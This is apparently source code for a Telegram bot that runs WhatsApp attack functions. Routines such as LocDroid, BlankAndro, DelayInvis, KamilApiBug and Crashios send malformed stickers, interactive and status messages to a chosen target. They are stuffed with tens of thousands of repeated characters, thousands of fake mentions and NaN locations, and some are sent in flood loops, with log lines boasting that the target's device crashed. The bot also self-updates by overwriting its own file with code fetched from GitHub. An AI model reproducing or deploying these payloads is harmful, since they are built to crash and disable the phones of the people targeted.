                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAVAwEAAhIDEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBIRIFIhMWFxsf/EABoBAAMBAQEBAAAAAAAAAAAAAAABAgMEBQb/2gAMAwEAAhADEAAAAfZSS1D2qkRBlGmq6qiuobHPRnHMGqWNSFjQhsi1i1WxOcC3zuhMl9J1Hzsx5k66vUmu7STnqZ2h3vOt9HkPJd/ms2VMyCmwjKsz1enFR6HJVJ6x3/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                caption: trigger,
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: true,
                id: "ABCDEF1234567890"
              }
            },
            mentionedJid: [
              target,
              "13135550002@s.whatsapp.net",
              ...Array.from(
                { length: 1998 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            stanzaId: sock.generateMessageTag(),
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: 999e+21 * Date.now()
              }
            },
          }
        }
      },
      {
        participant: { jid: target }
      }
    );

    console.log(chalk.green.bold(`[XuzoAI-2] LOCDROID SUCCESS! Target ${target} Kejang-Kejang. 😈🖕`));
    return true;
  } catch (err) {
    console.error(chalk.red(`[LocDroid Error] Gagal: ${err.message}`));
    return false;
  }
}

async function BlankAndro(sock, target) {
  try {
    logInfo(`[GenXuzoSystem] Start Sending Blank Andro To: ${target}`);
    
    await sock.relayMessage(
      target,
      {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "クソ、⃝҉⃝" + "ꦾ".repeat(40000),
          publisher: "ꦽ".repeat(20000),
          stickers: [],
          fileLength: 12260,
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          height: 9999,
          width: 9999,
          mediaKeyTimestamp: "1747502082",
          isAnimated: false,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          emojis: ["🐉", "👾", "🩸", "♻️"],
          contextInfo: {
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
          packDescription: "",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2D4MTQ5Zjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "3680054",
          stickerPackOrigin: "USER_CREATED",
        },
      },
      {
        participant: { jid: target },
      }
    );
    
    logInfo(`[GenXuzoSystem] Blank Andro Succesfully Send`);
    
    for (let i = 0; i < 5; i++) {
      await xploitcursor(sock, target);
      await sleep(100);
      logInfo(`[GenXuzoSystem] Iterasi ${i + 1}/5 selesai`);
    }
    
    return true;
  } catch (error) {
    logError(`[GenXusoSystem: ERROR] ${error.message}`);
    return false;
  }
}

async function Trashspam(sock, target) {
  try {
    for (let i = 0; i < 3; i++) {
      await Crashcrl(sock, target);
      await sleep(200);
    }
    return true;
  } catch (error) {
    logError('Trashspam error', error);
    return false;
  }
}

async function DelayInvis(sock, target) {
  try {
    console.log(chalk.red.bold(`[XuzoAI-2] UNLEASHING RESIDENT DELAY ON: ${target} 😈🖕`));
    const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

    let mentionList = Array.from({ length: 2000 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);

    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "Last Resident",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0003".repeat(5000),
              version: 3
            },
            contextInfo: {
              isChannelMessage: true, 
              mentionedJid: mentionList,
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: ".¿",
                newsletterJid: "25002008@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, { userJid: sock.user.id });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "Resident Delay" },
          content: undefined
        }
      ]
    });

    console.log(chalk.green.bold(`[XuzoAI-2] Resident Delay SUCCESS! Target ${target} Modar. `));
    return true;
  } catch (err) {
    console.error(chalk.red(`[CursorX Error] Gagal: ${err.message}`));
    return false;
  }
}


async function KamilApiBug(sock, target) {
  try {
    logInfo(chalk.red.bold(`[XuzoAI-2] EXECUTING SUPREME VOID ON: ${target} 😈🖕`));

    const ghost = "‪".repeat(1000) + "‎".repeat(1000);
    const heavyBuffer = Buffer.alloc(1024 * 50, "XUZO-DESTROYER");

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(15000),
              hasMediaAttachment: true,
              jpegThumbnail: heavyBuffer,
              locationMessage: {
                degreesLatitude: NaN,
                degreesLongitude: NaN,
                name: "XUZO-VOID".repeat(500),
                address: "󠀠".repeat(20000)
              }
            },
            body: {
              text: "‮".repeat(25000)
            },
            nativeFlowMessage: {
              buttons: [{
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: " ",
                  sections: Array.from({ length: 15 }, (_, i) => ({
                    title: "VOID-SECTION-" + i,
                    rows: Array.from({ length: 50 }, () => ({
                      title: "ꦾ".repeat(500),
                      rowId: "XUZO-KILL-" + crypto.randomBytes(100).toString('hex')
                    }))
                  }))
                })
              }],
              messageVersion: 4
            },
            contextInfo: {
              pushName: ghost,
              mentionedJid: Array.from({ length: 3000 }, () => "1@s.whatsapp.net"),
              externalAdReply: {
                title: " ".repeat(10000),
                body: "SYSTEM OBLIVION",
                mediaType: 2,
                thumbnail: heavyBuffer,
                renderLargerThumbnail: true,
                sourceUrl: "https://xuzo-superior.dev/death"
              }
            }
          }
        }
      }
    }, { 
      participant: { jid: target },
      additionalAttributes: { 'priority': 'high' } 
    });

    logInfo(chalk.green.bold(`[XuzoAI-2] Target ${target} has been sent to the void. 😈🖕`));
    return true;
  } catch (error) {
    logError(chalk.red(`[KamilApiBug Error] ${error.message}`));
    return false;
  }
}

async function Crashios(sock, target) {
  try {
    for (let i = 0; i < 50; i++) {
      await sock.sendMessage(target, {
        text: "🚀".repeat(500),
        mentions: [target]
      });
      await sleep(30);
    }
    return true;
  } catch (error) {
    logError('Crashios error', error);
    return false;
  }
}

async function isUserJoinedChannel(bot, channel, userId) {
  try {
    const member = await bot.getChatMember(channel, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    return false;
  }
}

// ==================== GLOBAL COMMAND HANDLER WRAPPER ====================
function createCommandHandler(pattern, callback) {
  bot.onText(pattern, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username;
    const commandText = msg.text;
    const command = commandText.split(' ')[0];
    
    updateUserLastActive(userId, username);
    
    // Cek global maintenance terlebih dahulu
    const maintenanceStatus = await checkGlobalMaintenance();
    if (shouldBlockByGlobalMaintenance(userId, command)) {
      const maintenanceMessage = `⚠️ GenXuzoSystem Maintenance
━━━━━━━━━━━━━━━━━━
System sedang maintenance global.

🛠 Reason: ${globalMaintenance.reason}
━━━━━━━━━━━━━━━━━━`;
      bot.sendMessage(chatId, maintenanceMessage);
      return;
    }
    
    // Cek local maintenance
    if (shouldBlock(userId)) {
      logInfo(`User ${userId} blocked by maintenance`);
      bot.sendMessage(chatId, "🚧 Maintenance Mode is ON\nPlease wait until maintenance is complete.");
      return;
    }
    
    try {
      await callback(msg, match);
    } catch (error) {
      logError(`Command error: ${commandText}`, error);
    }
  });
}

// ==================== COMMAND BARU: /update ====================
createCommandHandler(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Hanya owner yang dapat menggunakan command ini.");
  }

  try {
    logInfo("[GenXuzoSystem] Checking update...");
    await bot.sendMessage(chatId, "🔄 Checking for updates...");
    
    // Fetch index.js terbaru dari GitHub
    const remoteCode = await fetchFromGitHub(GITHUB_INDEX_FILE, false);
    
    // Baca file lokal
    const localCode = fs.readFileSync(__filename, 'utf8');
    
    // Bandingkan
    if (remoteCode === localCode) {
      logInfo("[GenXuzoSystem] No updates found.");
      return bot.sendMessage(chatId, "> Tidak ada update terbaru.");
    }
    
    // Ada update, timpa file
    logInfo("[GenXuzoSystem] Update Found!");
    fs.writeFileSync(__filename, remoteCode);
    logInfo("[GenXuzoSystem] System Success To Update✅");
    
    await bot.sendMessage(chatId, "✅ Update ditemukan! File telah diperbarui. Bot akan restart otomatis...");
    
    // Restart setelah 2 detik
    setTimeout(() => {
      process.exit(0);
    }, 2000);
    
  } catch (error) {
    logError("[GenXuzoSystem] Update error", error);
    bot.sendMessage(chatId, `❌ Gagal cek update: ${error.message}`);
  }
});

// ==================== COMMAND BARU: /status ====================
createCommandHandler(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const maintenanceStatus = await checkGlobalMaintenance();
  const localMaintenance = isMaintenance();
  
  let statusText = `🟢 *GenXuzoSystem Status*\n\n`;
  statusText += `*Local Maintenance:* ${localMaintenance ? 'ON 🚧' : 'OFF ✅'}\n`;
  statusText += `*Global Maintenance:* ${maintenanceStatus.maintenance ? 'ON 🚧' : 'OFF ✅'}\n`;
  
  if (maintenanceStatus.maintenance) {
    statusText += `*Reason:* ${maintenanceStatus.reason}\n`;
    statusText += `*Allow Owner:* ${maintenanceStatus.allowOwner ? 'YES ✅' : 'NO ❌'}\n`;
  }
  
  statusText += `\n*Bot Runtime:* ${getBotRuntime()}\n`;
  statusText += `*Users in History:* ${userHistory.size}\n`;
  statusText += `*Active Sessions:* ${Array.from(userSessions.values()).filter(s => s.status === "connected").length}\n`;
  statusText += `*GitHub Repo:* ${GITHUB_REPO}\n`;
  
  bot.sendMessage(chatId, statusText, { parse_mode: "Markdown" });
});

// ==================== COMMAND: /reqpair ====================
createCommandHandler(/\/reqpair (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/\D/g, "");

  const CHANNEL = "@liminalshadow0";
  const joined = await isUserJoinedChannel(bot, CHANNEL, userId);

  if (!joined) {
    return bot.sendMessage(
      chatId,
      `🚫 <b>Access Denied</b>

You must follow <b>${CHANNEL}</b> to use this feature.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Follow Channel", url: "https://t.me/liminalshadow0" }],
          ],
        },
      }
    );
  }

  try {
    await connectReqPair(botNumber, chatId, userId);
  } catch (err) {
    logError("REQPAIR ERROR", err);
    bot.sendMessage(chatId, "❌ Failed to start pairing process.");
  }
});

// ==================== COMMAND: /list ====================
createCommandHandler(/\/list/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isOwner(userId)) {
    if (userSessions.size === 0) {
      return bot.sendMessage(chatId, "📭 Tidak ada session aktif.");
    }

    let text = "📋 *ALL ACTIVE SESSIONS*\n\n";
    for (const [uid, session] of userSessions) {
      const username = session.telegramUsername ? `@${session.telegramUsername}` : uid;
      text += `• User: ${username}\n  WA: ${session.number || '-'}\n  Status: ${session.status}\n\n`;
    }
    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } else {
    const session = userSessions.get(userId);
    if (!session) {
      return bot.sendMessage(chatId, "📭 Anda belum memiliki session. Gunakan /reqpair <nomor>");
    }
    bot.sendMessage(chatId, `📋 *YOUR SESSION*\n\n• WA: ${session.number}\n• Status: ${session.status}`, { parse_mode: "Markdown" });
  }
});

// ==================== COMMAND: /clear ====================
createCommandHandler(/\/clear(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const arg = match ? match[1] : null;

  if (!arg) {
    if (!userSessions.has(userId)) {
      return bot.sendMessage(chatId, "❌ Anda tidak memiliki session.");
    }
    await clearUserSession(userId);
    return bot.sendMessage(chatId, "✅ Session Anda telah dihapus.");
  }

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Hanya owner yang dapat menggunakan opsi ini.");
  }

  if (arg.toLowerCase() === 'all') {
    for (const uid of userSessions.keys()) {
      await clearUserSession(uid);
    }
    return bot.sendMessage(chatId, "✅ Semua session telah dihapus.");
  }

  let targetId = arg.replace(/[^0-9]/g, "");
  if (arg.startsWith('@')) {
    for (const [uid, session] of userSessions) {
      if (session.telegramUsername === arg.slice(1)) {
        targetId = uid;
        break;
      }
    }
  }

  if (!userSessions.has(parseInt(targetId))) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan atau tidak memiliki session.");
  }

  await clearUserSession(parseInt(targetId));
  bot.sendMessage(chatId, `✅ Session user ${targetId} telah dihapus.`);
});

async function clearUserSession(telegramId) {
  const session = userSessions.get(telegramId);
  if (session) {
    if (session.socket) {
      try { await session.socket.logout(); } catch (e) {}
    }
    if (session.sessionDir && fs.existsSync(session.sessionDir)) {
      fs.rmSync(session.sessionDir, { recursive: true, force: true });
    }
    userSessions.delete(telegramId);
    saveUserSessions();
  }
}

// ==================== COMMAND: /history (FIXED PAGINATION) ====================
createCommandHandler(/\/history(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const page = match && match[1] ? parseInt(match[1]) : 1;
  const perPage = 5;

  const historyArray = Array.from(userHistory.values())
    .sort((a, b) => new Date(b.joinedAt) - new Date(a.joinedAt));

  const totalPages = Math.max(1, Math.ceil(historyArray.length / perPage));
  
  if (page < 1 || page > totalPages) {
    return bot.sendMessage(chatId, "❌ Halaman tidak valid.");
  }

  const start = (page - 1) * perPage;
  const end = start + perPage;
  const pageData = historyArray.slice(start, end);

  if (pageData.length === 0 && page === 1) {
    return bot.sendMessage(chatId, "📭 Belum ada data pengguna.");
  }

  let text = `📜 *USER HISTORY (Page ${page}/${totalPages})*\n\n`;
  pageData.forEach((user, idx) => {
    const username = user.telegramUsername ? `@${user.telegramUsername}` : user.telegramId;
    const joined = new Date(user.joinedAt).toISOString().split('T')[0];
    text += `${start + idx + 1}. ${username}\n   WA: ${user.waNumber || '-'}\n   ID: ${user.telegramId}\n   Joined: ${joined}\n\n`;
  });

  const keyboard = [];
  if (page > 1) keyboard.push({ text: "⬅️ Prev", callback_data: `history_prev_${page - 1}` });
  if (page < totalPages) keyboard.push({ text: "➡️ Next", callback_data: `history_next_${page + 1}` });

  const options = { parse_mode: "Markdown" };
  if (keyboard.length > 0) options.reply_markup = { inline_keyboard: [keyboard] };

  bot.sendMessage(chatId, text, options);
});

// ==================== COMMAND: /cs (Complete Statistic) ====================
createCommandHandler(/\/cs/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Hanya owner yang dapat mengakses statistik.");
  }

  const totalUsers = userHistory.size;
  const today = new Date().toISOString().split('T')[0];
  const activeToday = Array.from(userHistory.values())
    .filter(u => u.lastActive && u.lastActive.startsWith(today)).length;
  const totalPremium = premiumUsers.filter(u => new Date(u.expiresAt) > new Date()).length;
  const totalFree = totalUsers - totalPremium;

  const activeSessions = Array.from(userSessions.values()).filter(s => s.status === "connected").length;
  const userSessionsCount = activeSessions;
  const ownerSessionsCount = Array.from(userSessions.values())
    .filter(s => isOwner(s.telegramId) && s.status === "connected").length;

  const uptime = getBotRuntime();
  const ping = Date.now() - msg.date * 1000;
  let serverStatus = "EXCELLENT";
  if (ping > 1000) serverStatus = "POOR";
  else if (ping > 500) serverStatus = "GOOD";
  else if (ping > 200) serverStatus = "STABLE";

  const totalCommands = 0;
  const successCommands = 0;
  const errorCommands = 0;

  const analysis = errorCommands > 10 ? "⚠️ Banyak error terdeteksi, disarankan /restart" : "✅ Sistem stabil";

  const text = `
📊 *COMPLETE STATISTIC*

🧑‍💻 USER
• Total User: ${totalUsers}
• Aktif Hari Ini: ${activeToday}
• User Gratis: ${totalFree}
• User Premium: ${totalPremium}

📱 SESSION
• Total Session Aktif: ${activeSessions}
• Session User: ${userSessionsCount}
• Session Owner: ${ownerSessionsCount}

⚙️ BOT
• Uptime: ${uptime}
• Ping: ${ping} ms
• Status Server: ${serverStatus}

📦 AKTIVITAS
• Total Command: ${totalCommands}
• Sukses: ${successCommands}
• Error: ${errorCommands}

🛠️ ANALISIS
${analysis}
  `.trim();

  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

// ==================== COMMAND: /restart ====================
createCommandHandler(/\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Hanya owner yang dapat restart bot.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");
  setTimeout(() => {
    process.exit(0);
  }, 1000);
});

// ==================== MAINTENANCE COMMANDS ====================
createCommandHandler(/\/maintenance(?:\s+(on|off))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Owner only command.");
  }
  
  const action = match ? match[1] : null;
  
  if (!action) {
    const status = isMaintenance() ? "ON 🚧" : "OFF ✅";
    const since = maintenanceMode.since ? 
      `\nSince: ${new Date(maintenanceMode.since).toLocaleString()}` : '';
    
    return bot.sendMessage(
      chatId,
      `🔧 Maintenance Mode: ${status}${since}\n\nUse:\n/maintenance on\n/maintenance off`
    );
  }
  
  if (action === 'on') {
    if (isMaintenance()) {
      return bot.sendMessage(chatId, "⚠️ Maintenance already ON.");
    }
    
    maintenanceMode.enabled = true;
    maintenanceMode.since = new Date().toISOString();
    saveJSON(maintenanceFile, maintenanceMode);
    
    await broadcastToUsers(
      "🚧 *MAINTENANCE NOTICE*\n\nBot is currently under maintenance. Please wait until maintenance is complete.\n\nThank you for your patience.",
      { ownerChatId: chatId, parse_mode: "Markdown" }
    );
    
    bot.sendMessage(chatId, "✅ Maintenance mode ON. All non-owner commands blocked.");
    
  } else if (action === 'off') {
    if (!isMaintenance()) {
      return bot.sendMessage(chatId, "⚠️ Maintenance already OFF.");
    }
    
    maintenanceMode.enabled = false;
    saveJSON(maintenanceFile, maintenanceMode);
    
    await broadcastToUsers(
      "✅ *MAINTENANCE COMPLETE*\n\nBot is now back online. Thank you for your patience!",
      { ownerChatId: chatId, parse_mode: "Markdown" }
    );
    
    bot.sendMessage(chatId, "✅ Maintenance mode OFF. Bot is back to normal.");
  }
});

// ==================== BROADCAST COMMAND ====================
createCommandHandler(/\/bc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageText = match ? match[1] : null;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Owner only command.");
  }
  
  const isReply = msg.reply_to_message;
  let broadcastMessage = "";
  let photo = null;
  let buttons = [];
  
  if (messageText) {
    const parts = messageText.split('|').map(p => p.trim());
    broadcastMessage = parts[0];
    
    if (parts.length > 1) {
      for (let i = 1; i < parts.length; i += 2) {
        if (i + 1 < parts.length) {
          const buttonText = parts[i + 1];
          const buttonUrl = parts[i];
          
          if (buttonUrl.match(/^(https?|t\.me):\/\//)) {
            buttons.push({
              text: buttonText,
              url: buttonUrl
            });
          }
          
          if (buttons.length >= 4) break;
        }
      }
    }
  }
  
  if (isReply) {
    const repliedMsg = msg.reply_to_message;
    
    if (repliedMsg.photo) {
      const largestPhoto = repliedMsg.photo.sort((a, b) => b.file_size - a.file_size)[0];
      photo = largestPhoto.file_id;
    }
    
    if (repliedMsg.caption) {
      broadcastMessage = repliedMsg.caption + (broadcastMessage ? '\n\n' + broadcastMessage : '');
    } else if (repliedMsg.text && !broadcastMessage) {
      broadcastMessage = repliedMsg.text;
    }
    
    if (!broadcastMessage && !photo) {
      return bot.sendMessage(chatId, "❌ No content to broadcast.");
    }
  }
  
  if (!broadcastMessage && !photo) {
    return bot.sendMessage(
      chatId,
      "📢 Broadcast Usage:\n\n" +
      "1. Text only: `/bc Hello World`\n" +
      "2. With buttons: `/bc Hello | https://t.me/liminalshadow0 | Channel`\n" +
      "3. Multiple buttons: `/bc Hello | https://a.com | A, https://b.com | B`\n" +
      "4. Reply to message (with/without photo): Reply to a message and type `/bc`\n" +
      "5. Reply with buttons: Reply to a message and type `/bc | https://t.me/liminalshadow0 | Button`",
      { parse_mode: "Markdown" }
    );
  }
  
  let reply_markup = null;
  if (buttons.length > 0) {
    reply_markup = {
      inline_keyboard: [buttons]
    };
  }
  
  const confirmMsg = await bot.sendMessage(
    chatId,
    `📢 Confirm Broadcast\n\n` +
    `Message: ${broadcastMessage?.substring(0, 100) || '(Photo only)'}...\n` +
    `Buttons: ${buttons.length}\n` +
    `To: ${userHistory.size} users\n\n` +
    `Send "CONFIRM" to proceed or anything else to cancel.`,
    { reply_markup: { force_reply: true } }
  );
  
  const listenerId = bot.onReplyToMessage(chatId, confirmMsg.message_id, async (confirmMsg) => {
    bot.removeReplyListener(listenerId);
    
    if (confirmMsg.text?.toUpperCase() === 'CONFIRM') {
      await bot.sendMessage(chatId, "🔄 Starting broadcast...");
      
      const result = await broadcastToUsers(broadcastMessage, {
        ownerChatId: chatId,
        photo: photo,
        reply_markup: reply_markup,
        parse_mode: "HTML"
      });
      
      const currentLogs = loadJSON(logFile, []);
      currentLogs.push({
        timestamp: new Date().toISOString(),
        userId: userId,
        command: "/bc",
        context: "broadcast",
        result: result
      });
      saveJSON(logFile, currentLogs.slice(-100));
      
    } else {
      await bot.sendMessage(chatId, "❌ Broadcast cancelled.");
    }
  });
});

// ==================== ADD IMAGE COMMAND ====================
createCommandHandler(/\/addimg(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Owner only command.");
  }
  
  const input = match ? match[1] : null;
  const isReply = msg.reply_to_message;
  
  if (input) {
    const links = input.split(',').map(link => link.trim()).filter(link => link);
    const validLinks = [];
    
    for (const link of links) {
      if (link.match(/^https?:\/\//)) {
        validLinks.push(link);
      }
    }
    
    if (validLinks.length === 0) {
      return bot.sendMessage(chatId, "❌ No valid URLs found. URLs must start with http:// or https://");
    }
    
    const oldCount = imageList.length;
    imageList.push(...validLinks);
    saveJSON(imageFile, imageList);
    
    bot.sendMessage(
      chatId,
      `✅ Added ${validLinks.length} image(s) to gallery.\nTotal images: ${imageList.length}`,
      { reply_markup: { inline_keyboard: [[{ text: "View Gallery", callback_data: "view_gallery" }]] } }
    );
    
  } else if (isReply) {
    const repliedMsg = msg.reply_to_message;
    let photos = [];
    
    if (repliedMsg.media_group_id) {
      return bot.sendMessage(chatId, "❌ Photo albums not supported yet. Please send single photos.");
    }
    
    if (repliedMsg.photo) {
      photos = [repliedMsg.photo.sort((a, b) => b.file_size - a.file_size)[0]];
    } else {
      return bot.sendMessage(chatId, "❌ Please reply to a photo message.");
    }
    
    const progressMsg = await bot.sendMessage(
      chatId,
      `📤 Uploading ${photos.length} image(s) to Catbox...\nProgress: 0/${photos.length}`
    );
    
    let uploadedCount = 0;
    const uploadedLinks = [];
    
    for (const photo of photos) {
      try {
        const file = await bot.getFile(photo.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data);
        
        const catboxUrl = await uploadToCatbox(buffer, `image_${Date.now()}.jpg`);
        uploadedLinks.push(catboxUrl);
        uploadedCount++;
        
        if (uploadedCount === 1 || uploadedCount === photos.length) {
          await safeEditMessage(
            chatId,
            progressMsg.message_id,
            `📤 Uploading ${photos.length} image(s) to Catbox...\nProgress: ${uploadedCount}/${photos.length}`
          );
        }
        
      } catch (error) {
        logError("Upload error", error);
        const currentLogs = loadJSON(logFile, []);
        currentLogs.push({
          timestamp: new Date().toISOString(),
          userId: userId,
          error: {
            name: error.name,
            message: error.message
          },
          context: "addimg_upload"
        });
        saveJSON(logFile, currentLogs.slice(-100));
      }
      
      await sleep(500);
    }
    
    if (uploadedLinks.length > 0) {
      imageList.push(...uploadedLinks);
      saveJSON(imageFile, imageList);
    }
    
    await safeEditMessage(
      chatId,
      progressMsg.message_id,
      `✅ Upload complete!\n` +
      `Success: ${uploadedLinks.length}/${photos.length}\n` +
      `Total images in gallery: ${imageList.length}`,
      {
        reply_markup: { inline_keyboard: [[{ text: "View Gallery", callback_data: "view_gallery" }]] }
      }
    );
    
  } else {
    bot.sendMessage(
      chatId,
      "📸 Add Image Usage:\n\n" +
      "1. Add by links: `/addimg https://catbox.moe/a.jpg,https://catbox.moe/b.jpg`\n" +
      "2. Add by photo: Reply to a photo and type `/addimg`\n\n" +
      `Current gallery has ${imageList.length} images.`,
      { parse_mode: "Markdown" }
    );
  }
});

// ==================== SET COOLDOWN COMMAND ====================
createCommandHandler(/\/setcd/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "🚫 Owner only command.");
  }
  
  const currentConfig = `
🔧 Current Cooldown Configuration:

Free Users: ${formatSeconds(cooldownConfig.free)}
Premium Users: ${formatSeconds(cooldownConfig.premium)}
Owner: ${formatSeconds(cooldownConfig.owner)}

To change, send new values in this format:
free:60s premium:30s owner:0

Examples:
• free:5m premium:1m owner:0
• free:300 premium:60 owner:0
• free:1h premium:10m owner:10s

Time units: s (seconds), m (minutes), h (hours), d (days)
  `.trim();
  
  const replyMsg = await bot.sendMessage(
    chatId,
    currentConfig,
    { reply_markup: { force_reply: true } }
  );
  
  const listenerId = bot.onReplyToMessage(chatId, replyMsg.message_id, async (response) => {
    bot.removeReplyListener(listenerId);
    
    if (!response.text) {
      return bot.sendMessage(chatId, "❌ No input received.");
    }
    
    const input = response.text.toLowerCase();
    const updates = {};
    let hasUpdate = false;
    
    const patterns = [
      /free:\s*([^\s]+)/i,
      /premium:\s*([^\s]+)/i,
      /owner:\s*([^\s]+)/i
    ];
    
    const matches = patterns.map(pattern => input.match(pattern));
    
    if (matches[0]) {
      const freeTime = parseTimeInput(matches[0][1]);
      if (freeTime !== null) {
        updates.free = freeTime;
        hasUpdate = true;
      }
    }
    
    if (matches[1]) {
      const premiumTime = parseTimeInput(matches[1][1]);
      if (premiumTime !== null) {
        updates.premium = premiumTime;
        hasUpdate = true;
      }
    }
    
    if (matches[2]) {
      const ownerTime = parseTimeInput(matches[2][1]);
      if (ownerTime !== null) {
        updates.owner = ownerTime;
        hasUpdate = true;
      }
    }
    
    if (!hasUpdate) {
      return bot.sendMessage(
        chatId,
        "❌ Invalid format. Please use: free:X premium:Y owner:Z\nExample: free:5m premium:1m owner:0"
      );
    }
    
    cooldownConfig = { ...cooldownConfig, ...updates };
    saveJSON(cooldownFile, cooldownConfig);
    
    const newConfig = `
✅ Cooldown configuration updated!

Free Users: ${formatSeconds(cooldownConfig.free)}
